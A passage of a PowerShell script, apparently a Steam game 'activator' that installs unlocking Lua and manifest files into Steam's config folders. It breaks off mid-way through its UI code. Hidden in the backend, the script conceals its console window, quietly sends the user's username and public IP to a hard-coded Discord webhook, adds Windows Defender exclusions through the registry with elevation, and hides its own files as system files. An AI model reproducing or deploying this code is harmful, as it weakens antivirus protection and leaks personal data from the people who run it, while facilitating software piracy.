<#
    BastissSteam Activator v1.0
    PowerShell 5.1 WinForms GUI
    Merged: pretty UI + full backend (code redemption, download, timers)
#>

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  BACKEND
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

$script:version = "1.0"
$errorLogFile = Join-Path $env:TEMP "bsmap_error.log"

function Write-ErrorLog {
    param([string]$Msg, $Ex)
    try {
        $text = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg"
        if ($Ex) { $text += "`nEXCEPTION: $($Ex.Exception)`nAT: $($Ex.InvocationInfo.PositionMessage)`nSTACK: $($Ex.ScriptStackTrace)" }
        Add-Content -Path $errorLogFile -Value $text -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}

Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue | Out-Null
Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue | Out-Null
[System.Windows.Forms.Application]::EnableVisualStyles()

# Hide console window
Add-Type -Name W -Namespace C -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
' -ErrorAction SilentlyContinue | Out-Null
[C.W]::ShowWindow([C.W]::GetConsoleWindow(), 0) | Out-Null

# ---- Discord Webhook ----
$WEBHOOK_URL = "https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
function Send-Webhook {
    param([string]$codigo, [string]$traduccion)
    try {
        $ip = (Invoke-RestMethod "https://api.ipify.org" -UseBasicParsing -ErrorAction SilentlyContinue)
        $user = [Environment]::UserName
        $bt = [char]96
        $content = "**Usuario:** $user ($ip)**`nCodigo usado:**`n$bt$bt$bt$codigo$bt$bt$bt`n**Traduccion:**`n$bt$bt$bt$traduccion$bt$bt$bt"
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# ---- Client ID ----
$CLIENT_ID_FILE = Join-Path $env:LOCALAPPDATA "bsmap_client_id.txt"
function Get-ClientId {
    if (Test-Path $CLIENT_ID_FILE) {
        try { return (Get-Content $CLIENT_ID_FILE -Raw -ErrorAction Stop).Trim() } catch {}
    }
    $id = "PC-" + (-join ((48..57)+(65..90) | Get-Random -Count 32 | ForEach-Object { [char]$_ }))
    try { Set-Content $CLIENT_ID_FILE $id -Force -ErrorAction Stop } catch {}
    return $id
}
$script:clientId = Get-ClientId

# ---- Steam Path ----
function Get-SteamPath {
    $paths = @(
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name SteamPath -ErrorAction SilentlyContinue).SteamPath,
        "${env:ProgramFiles(x86)}\Steam",
        "${env:ProgramFiles(x86)}\Steamm",
        "$env:ProgramFiles\Steam",
        "C:\xdd"
    )
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p) -and (Test-Path (Join-Path $p "steam.exe"))) { return $p }
    }
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p)) { return $p }
    }
    throw "No se encontro Steam en el registro ni en rutas tipicas."
}

# ---- Safe Font ----
function Get-SafeFont {
    param([string]$Family = "Segoe UI", [float]$Size = 10, $Style = [System.Drawing.FontStyle]::Regular)
    $fallbacks = @($Family, "Arial", "Microsoft Sans Serif", "Tahoma", "Segoe UI")
    foreach ($f in $fallbacks) {
        try { return New-Object System.Drawing.Font($f, $Size, $Style) } catch {}
    }
    return New-Object System.Drawing.Font("Arial", $Size, $Style)
}

# ---- Defender Exclusion ----
function Add-DefenderExclusion {
    param([string]$Path)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"
    $current = try { (Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name } catch { @() }
    if ($current -contains $Path) { return $true }
    try {
        Set-ItemProperty -Path $regPath -Name $Path -Value 0 -Type DWord -ErrorAction Stop
        return $true
    } catch {}
    try {
        $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -Wait -ErrorAction Stop
        return $true
    } catch { return $false }
}

# ---- Internet Time + Timer System ----
$TIMERS_FILE = Join-Path $env:LOCALAPPDATA "bsmap_timers.json"
$script:internetTimeCache = $null
$script:internetTimeCacheTime = (Get-Date).AddDays(-1)

function Get-InternetTime {
    $nowLocal = Get-Date
    if (($nowLocal - $script:internetTimeCacheTime).TotalSeconds -le 60 -and $script:internetTimeCache) {
        return $script:internetTimeCache
    }
    try {
        $r = Invoke-RestMethod "https://worldtimeapi.org/api/ip" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        $t = [datetime]::ParseExact($r.utc_datetime.Substring(0, 19), 'yyyy-MM-ddTHH:mm:ss', $null)
        $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
        return $t
    } catch {
        try {
            $r = Invoke-RestMethod "https://timeapi.io/api/Time/current/zone?timeZone=UTC" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            $t = [datetime]::ParseExact($r.dateTime.Substring(0, 19), 'yyyy-MM-ddTHH:mm:ss', $null)
            $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
            return $t
        } catch { return $null }
    }
}

function Get-Now {
    $net = Get-InternetTime
    if ($net) { return $net, $true }
    return (Get-Date), $false
}

function Get-ActiveTimers {
    if (Test-Path $TIMERS_FILE) { try { $r = @(Get-Content $TIMERS_FILE -Raw | ConvertFrom-Json); return ,$r } catch {} }
    return @()
}

function Save-Timers {
    param($t)
    $t | ConvertTo-Json | Set-Content $TIMERS_FILE -Force
    try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Value ($t | ConvertTo-Json -Compress) -Type String -Force -ErrorAction SilentlyContinue } catch {}
}

function Remove-FileHard {
    param([string]$p)
    if (-not (Test-Path $p)) { return }
    Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 200
    try { [System.IO.File]::Delete($p) } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 500
    try { $a = Get-Item $p -Force -ErrorAction SilentlyContinue; if ($a) { $a.Attributes = 'Normal'; Remove-Item $p -Force } } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 1000
    try { Remove-Item -Path $p -Force -ErrorAction Stop } catch {}
}

function Remove-ExpiredTimers {
    $timers = Get-ActiveTimers; $remaining = @()
    $now, $isNet = Get-Now
    if (-not $isNet -and $timers.Count -gt 0) {
        $earliest = $timers | ForEach-Object { $_.internet_created_at } | Where-Object { $_ } | Sort-Object | Select-Object -First 1
        if ($earliest) { $ec = $earliest -as [datetime]; if ($ec -and $ec -gt (Get-Date)) { $now = $ec.AddDays(365) } }
    }
    foreach ($t in $timers) {
        $exp = $t.expires_at -as [datetime]; if (-not $exp) { $remaining += $t; continue }
        if ($exp -le $now) {
            $gameStillActive = $remaining | Where-Object { $_.game_name -eq $t.game_name }
            if ($gameStillActive) { $remaining += $t; continue }
            $root = $t.steam_root
            foreach ($f in $t.lua_files) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }
            foreach ($f in $t.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) }
        } else { $remaining += $t }
    }
    Save-Timers $remaining; return $remaining
}

# ---- Server URL (auto-fetch from GitHub) ----
$script:serverUrl = "http://localhost:8768"
function Update-ServerUrl {
    try {
        $apiResult = Invoke-RestMethod -Uri "https://api.github.com/repos/bastisayes/Fixes-steam/contents/original_blue.ps1" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
        if ($apiResult.content) {
            $b64 = $apiResult.content -replace "`n|`r", ""
            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
            if ($decoded -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
                $newUrl = $matches[1]
                if ($newUrl -ne "https://EJEMPLO.lhr.life" -and $newUrl -ne $script:serverUrl) {
                    $script:serverUrl = $newUrl
                }
            }
        }
    } catch {}
}
# Initial fetch on startup
try {
    $apiResult = Invoke-RestMethod -Uri "https://api.github.com/repos/bastisayes/Fixes-steam/contents/original_blue.ps1" -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    if ($apiResult.content) {
        $b64 = $apiResult.content -replace "`n|`r", ""
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
        if ($decoded -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
            $fetchedUrl = $matches[1]
            if ($fetchedUrl -ne "https://EJEMPLO.lhr.life") { $script:serverUrl = $fetchedUrl }
        }
    }
} catch {}

# ---- MediaFire Download (segmented) ----
function Download-MediaFire {
    param([string]$url, [string]$outFile, $progressBar = $null, [int]$progressStart = 0, [int]$progressEnd = 100)
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if ($url -match "github\.com.*/raw/") {
        $dlUrl = $url; $cc = $null
    } else {
        $pageReq = [System.Net.HttpWebRequest]::Create($url)
        $pageReq.Method = "GET"; $pageReq.UserAgent = $ua; $pageReq.AllowAutoRedirect = $true
        $pageReq.Timeout = 30000; $pageReq.ReadWriteTimeout = 30000
        $pageReq.ServicePoint.Expect100Continue = $false; $pageReq.ServicePoint.UseNagleAlgorithm = $false
        $pageReq.ProtocolVersion = [System.Net.HttpVersion]::Version11; $pageReq.KeepAlive = $true
        $cc = New-Object System.Net.CookieContainer; $pageReq.CookieContainer = $cc
        $pageResp = $pageReq.GetResponse()
        $sr = New-Object System.IO.StreamReader $pageResp.GetResponseStream()
        $html = $sr.ReadToEnd()
        $sr.Close(); $pageResp.Close()
        $m = [regex]::Match($html, 'class="input\s+popsok"[^>]*href="([^"]+)"')
        if (-not $m.Success) { throw "No se pudo obtener el enlace de descarga de MediaFire." }
        $dlUrl = $m.Groups[1].Value
        $pageReq = $null; $pageResp = $null
    }
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 64
    [System.Net.ServicePointManager]::Expect100Continue = $false
    $headReq = [System.Net.HttpWebRequest]::Create($dlUrl)
    $headReq.Method = "HEAD"; $headReq.UserAgent = $ua; $headReq.AllowAutoRedirect = $true
    $headReq.Timeout = 15000
    if ($cc) { $headReq.CookieContainer = $cc }
    $headResp = $headReq.GetResponse()
    $totalSize = $headResp.ContentLength
    $headResp.Close()
    if ($totalSize -le 0) {
        $dlReq2 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq2.Method = "GET"; $dlReq2.UserAgent = $ua; $dlReq2.AllowAutoRedirect = $true
        $dlReq2.Timeout = 30000; $dlReq2.ReadWriteTimeout = 60000
        if ($cc) { $dlReq2.CookieContainer = $cc }
        $dlResp2 = $dlReq2.GetResponse()
        $totalSize = $dlResp2.ContentLength
        $str2 = $dlResp2.GetResponseStream(); $buf2 = New-Object byte[] 262144
        $fs2 = [System.IO.File]::Create($outFile); $tr = 0; $lp = -1
        try { while (($n2 = $str2.Read($buf2, 0, $buf2.Length)) -gt 0) { $fs2.Write($buf2, 0, $n2); $tr += $n2; if ($totalSize -gt 0 -and $progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr / $totalSize)); if ($pct -ne $lp) { $progressBar.Value = $pct; $lp = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str2.Close(); $fs2.Close(); $dlResp2.Close() }
        return
    }
    $connections = if ($totalSize -lt 5MB) { 1 } elseif ($totalSize -lt 50MB) { 4 } elseif ($totalSize -lt 500MB) { 8 } else { 16 }
    if ($connections -le 1) {
        $dlReq3 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq3.Method = "GET"; $dlReq3.UserAgent = $ua; $dlReq3.AllowAutoRedirect = $true
        $dlReq3.Timeout = 120000; $dlReq3.ReadWriteTimeout = 120000
        $dlReq3.ServicePoint.Expect100Continue = $false; $dlReq3.ServicePoint.UseNagleAlgorithm = $false
        $dlReq3.ProtocolVersion = [System.Net.HttpVersion]::Version11; $dlReq3.KeepAlive = $true
        if ($cc) { $dlReq3.CookieContainer = $cc }
        $dlResp3 = $dlReq3.GetResponse()
        $str3 = $dlResp3.GetResponseStream(); $buf3 = New-Object byte[] 262144
        $fs3 = [System.IO.File]::Create($outFile); $tr3 = 0; $lp3 = -1
        try { while (($n3 = $str3.Read($buf3, 0, $buf3.Length)) -gt 0) { $fs3.Write($buf3, 0, $n3); $tr3 += $n3; if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr3 / $totalSize)); if ($pct -ne $lp3) { $progressBar.Value = $pct; $lp3 = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str3.Close(); $fs3.Close(); $dlResp3.Close() }
        return
    }
    $chunkSize = [math]::Ceiling($totalSize / $connections)
    $tempDir = [System.IO.Path]::GetTempPath()
    $fileBase = [System.IO.Path]::GetFileNameWithoutExtension($outFile) + "_mfdl"
    $chunkFiles = @(); $runspaces = @(); $maxRetries = 3; $bufSize = 262144
    for ($i = 0; $i -lt $connections; $i++) {
        $start = $i * $chunkSize
        if ($start -ge $totalSize) { break }
        $end = [math]::Min($start + $chunkSize - 1, $totalSize - 1)
        $chunkFile = Join-Path $tempDir "${fileBase}_${i}.tmp"
        $chunkFiles += $chunkFile
        $cs = { param($u, $s, $e, $o, $ua2, $cc2, $bs, $mr)
            $le = $null
            for ($a = 1; $a -le $mr; $a++) {
                try {
                    $r = [System.Net.HttpWebRequest]::Create($u)
                    $r.Method = "GET"; $r.UserAgent = $ua2; $r.AllowAutoRedirect = $true
                    $r.Timeout = 120000; $r.ReadWriteTimeout = 120000
                    $r.ServicePoint.Expect100Continue = $false; $r.ServicePoint.UseNagleAlgorithm = $false
                    $r.ProtocolVersion = [System.Net.HttpVersion]::Version11; $r.KeepAlive = $true
                    if ($cc2) { $r.CookieContainer = $cc2 }
                    $r.AddRange($s, $e)
                    $rp = $r.GetResponse()
                    $f = [System.IO.File]::Create($o)
                    $st = $rp.GetResponseStream(); $b = New-Object byte[] $bs
                    while (($nr = $st.Read($b, 0, $bs)) -gt 0) { $f.Write($b, 0, $nr) }
                    $f.Close(); $st.Close(); $rp.Close()
                    return
                } catch { $le = $_; if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue } }
            }
            throw "Chunk failed after $mr attempts: $le"
        }
        $ps = [powershell]::Create(); $rs = [RunspaceFactory]::CreateRunspace()
        $ps.Runspace = $rs; $rs.Open()
        [void]$ps.AddScript($cs).AddArgument($dlUrl).AddArgument([long]$start).AddArgument([long]$end).AddArgument($chunkFile).AddArgument($ua).AddArgument($cc).AddArgument($bufSize).AddArgument($maxRetries)
        $runspaces += @{ps=$ps;handle=$ps.BeginInvoke();file=$chunkFile;rs=$rs}
    }
    $chunkErrors = @(); $completed = 0; $totalChunks = $runspaces.Count
    foreach ($rs2 in $runspaces) {
        try { $rs2.ps.EndInvoke($rs2.handle); $completed++ }
        catch { $chunkErrors += "[$($rs2.file)] $($_.Exception.Message)" }
        $rs2.ps.Dispose(); $rs2.rs.Dispose()
        if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $completed / $totalChunks)); $progressBar.Value = $pct; [System.Windows.Forms.Application]::DoEvents() }
    }
    if ($chunkErrors.Count -gt 0) {
        foreach ($cf in $chunkFiles) { if (Test-Path $cf) { Remove-Item $cf -Force -ErrorAction SilentlyContinue } }
        throw "Error en descarga segmentada: $($chunkErrors -join '; ')"
    }
    $fsOut = [System.IO.File]::Create($outFile)
    $mergeBuf = New-Object byte[] 1048576
    foreach ($cf in $chunkFiles) {
        $fsIn = [System.IO.File]::OpenRead($cf)
        while (($nm = $fsIn.Read($mergeBuf, 0, $mergeBuf.Length)) -gt 0) { $fsOut.Write($mergeBuf, 0, $nm) }
        $fsIn.Close()
    }
    $fsOut.Close()
    foreach ($cf in $chunkFiles) { Remove-Item $cf -Force -ErrorAction SilentlyContinue }
    $actualSize = (Get-Item $outFile).Length
    if ($actualSize -ne $totalSize) {
        Remove-Item $outFile -Force -ErrorAction SilentlyContinue
        throw "TamaÃ±o incorrecto: $actualSize vs $totalSize"
    }
    if ($progressBar) { $progressBar.Value = $progressEnd; [System.Windows.Forms.Application]::DoEvents() }
}

# ---- Extract and Install ----
function Extract-AndInstall {
    param([string]$zipPath, [string]$gameName = $null, $expirationDate = $null)
    $steamRoot = Get-SteamPath
    $luaDir = Join-Path $steamRoot "config\stplug-in"
    $luaDir2 = Join-Path $steamRoot "config\lua"
    $manifestDir = Join-Path $steamRoot "config\depotcache"
    if (-not (Test-Path $luaDir)) { New-Item -ItemType Directory -Path $luaDir -Force | Out-Null }
    if (-not (Test-Path $luaDir2)) { New-Item -ItemType Directory -Path $luaDir2 -Force | Out-Null }
    if (-not (Test-Path $manifestDir)) { New-Item -ItemType Directory -Path $manifestDir -Force | Out-Null }
    $tempDir = Join-Path $env:TEMP "bsmap_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $result = @{ lua = @(); manifest = @(); steamRoot = $steamRoot }
    try {
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
        if ($gameName -and $expirationDate) {
            $header = "-- BSMAP_EXPIRES:$($expirationDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gameName`n"
            Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object {
                try { $c = [System.IO.File]::ReadAllText($_.FullName); [System.IO.File]::WriteAllText($_.FullName, $header + $c) } catch {}
            }
        }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object { Copy-Item -Path $_.FullName -Destination $luaDir -Force; Copy-Item -Path $_.FullName -Destination $luaDir2 -Force; $result.lua += $_.Name }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { Copy-Item -Path $_.FullName -Destination $manifestDir -Force; $result.manifest += $_.Name }
    } finally {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $result
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  UI - Dark Title Bar via DWM API
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DwmHelper {
    [DllImport("dwmapi.dll")]
    public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
}
"@

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Double-Buffered Panel
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Add-Type -ReferencedAssemblies @("System.Windows.Forms","System.Drawing") -TypeDefinition @"
using System.Windows.Forms;
public class BufferedPanel : Panel {
    public BufferedPanel() {
        this.DoubleBuffered = true;
        this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
    }
}
"@

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  COLOR PALETTE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$script:BG           = [System.Drawing.Color]::FromArgb(11, 15, 25)
$script:CardBG       = [System.Drawing.Color]::FromArgb(18, 24, 38)
$script:CardHover    = [System.Drawing.Color]::FromArgb(25, 33, 52)
$script:CardBorder   = [System.Drawing.Color]::FromArgb(32, 48, 68)
$script:White        = [System.Drawing.Color]::White
$script:Gray         = [System.Drawing.Color]::FromArgb(130, 142, 162)
$script:Green        = [System.Drawing.Color]::FromArgb(60, 220, 100)
$script:Blue         = [System.Drawing.Color]::FromArgb(30, 144, 255)
$script:Cyan         = [System.Drawing.Color]::FromArgb(0, 180, 230)
$script:Yellow       = [System.Drawing.Color]::FromArgb(255, 210, 0)
$script:LightBlue    = [System.Drawing.Color]::FromArgb(80, 160, 255)
$script:DarkBlue1    = [System.Drawing.Color]::FromArgb(25, 100, 200)
$script:DarkBlue2    = [System.Drawing.Color]::FromArgb(10, 60, 140)
$script:TikPink      = [System.Drawing.Color]::FromArgb(254, 44, 85)
$script:DiscordBlue  = [System.Drawing.Color]::FromArgb(88, 101, 242)
$script:Red          = [System.Drawing.Color]::FromArgb(255, 60, 60)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  FONTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$script:FntTitleBig     = Get-SafeFont "Segoe UI" 26 ([System.Drawing.FontStyle]::Bold)
$script:FntActivator    = Get-SafeFont "Segoe UI" 11
$script:FntCardTitle    = Get-SafeFont "Segoe UI Semibold" 13 ([System.Drawing.FontStyle]::Bold)
$script:FntCardSub      = Get-SafeFont "Segoe UI" 9
$script:FntStatusBold   = Get-SafeFont "Segoe UI" 10 ([System.Drawing.FontStyle]::Bold)
$script:FntArrow        = Get-SafeFont "Segoe UI" 16 ([System.Drawing.FontStyle]::Bold)
$script:FntSalir        = Get-SafeFont "Segoe UI Semibold" 12 ([System.Drawing.FontStyle]::Bold)
$script:FntSmall        = Get-SafeFont "Consolas" 8
$script:FntTiny         = Get-SafeFont "Consolas" 7

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  DYNAMIC STATUS VARIABLES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$script:dynStatusText = "Listo"
$script:dynStatusColor = $script:Green

function Set-Status {
    param([string]$text, $color = $script:Green)
    $script:dynStatusText = $text
    $script:dynStatusColor = $color
    try { $script:statusPanel.Invalidate() } catch {}
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  HELPER: ROUNDED RECTANGLE PATH
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function New-RoundedRect {
    param([float]$x, [float]$y, [float]$w, [float]$h, [float]$r)
    $path = New-Object System.Drawing.Drawing2D.GraphicsPath
    $d = $r * 2
    $path.AddArc($x, $y, $d, $d, 180, 90)
    $path.AddArc($x + $w - $d, $y, $d, $d, 270, 90)
    $path.AddArc($x + $w - $d, $y + $h - $d, $d, $d, 0, 90)
    $path.AddArc($x, $y + $h - $d, $d, $d, 90, 90)
    $path.CloseFigure()
    return $path
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  LAYOUT CONSTANTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$PAD          = 20
$FORM_W       = 510
$CONTENT_W    = $FORM_W - (2 * $PAD)
$CARD_GAP     = 12
$HALF_W       = [int](($CONTENT_W - $CARD_GAP) / 2)
$CARD_H       = 92
$FULL_CARD_H  = 88
$CORNER_R     = 12

$HEADER_H     = 175
$STATUS_Y     = $HEADER_H
$STATUS_H     = 42
$ROW1_Y       = $STATUS_Y + $STATUS_H + 14
$ROW2_Y       = $ROW1_Y + $CARD_H + 12
$DISCORD_Y    = $ROW2_Y + $CARD_H + 18
$TIKTOK_Y     = $DISCORD_Y + $FULL_CARD_H + 12
$TIMERS_Y     = $TIKTOK_Y + $FULL_CARD_H + 14
$TIMERS_H     = 110
$SALIR_Y      = $TIMERS_Y + $TIMERS_H + 12
$SALIR_H      = 48
$FORM_H       = $SALIR_Y + $SALIR_H + 20

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  CREATE MAIN FORM
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$form = New-Object System.Windows.Forms.Form
$form.Text = "BastissSteam Activator v$($script:version)"
$form.ClientSize = New-Object System.Drawing.Size($FORM_W, $FORM_H)
$form.StartPosition = "CenterScreen"
$form.BackColor = $BG
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox = $false

# Create Steam icon for title bar
$iconBmp = New-Object System.Drawing.Bitmap(32, 32)
$ig = [System.Drawing.Graphics]::FromImage($iconBmp)
$ig.SmoothingMode = 'AntiAlias'
$igBrush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
    (New-Object System.Drawing.Point(0,0)),
    (New-Object System.Drawing.Point(32,32)),
    $DarkBlue1, $DarkBlue2
)
